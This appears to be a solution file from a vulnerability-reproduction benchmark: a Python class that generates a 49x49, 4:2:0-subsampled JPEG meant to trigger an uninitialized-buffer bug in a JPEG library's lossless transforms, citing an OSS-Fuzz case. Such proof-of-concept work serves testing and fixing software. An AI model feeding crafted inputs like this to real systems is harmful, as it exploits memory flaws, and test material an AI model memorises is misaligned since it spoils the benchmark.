import io
from PIL import Image

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability occurs during lossless transformations of JPEG images
        # where the destination buffer is not properly initialized. This can be
        # triggered by using an image with dimensions that are not a multiple of
        # the MCU (Minimum Coded Unit) size. For JPEGs with 4:2:0 chroma
        # subsampling, the MCU is typically 16x16 pixels.
        # The original PoC from OSS-Fuzz used a 49x49 pixel image. We will
        # generate a similar image, which is not aligned to 8 or 16 pixels.
        
        width = 49
        height = 49
        
        # Create a simple RGB image. The content is not critical, but the
        # structure of the resulting JPEG is.
        image = Image.new('RGB', (width, height), color=(255, 0, 0))
        
        # Use an in-memory buffer to store the generated JPEG data.
        buffer = io.BytesIO()
        
        # Save the image in JPEG format with 4:2:0 subsampling to ensure
        # the MCU-related edge case is triggered in the vulnerable code path.
        image.save(
            buffer,
            format='JPEG',
            quality=95,
            subsampling='4:2:0'
        )
        
        # Return the generated JPEG data as bytes.
        return buffer.getvalue()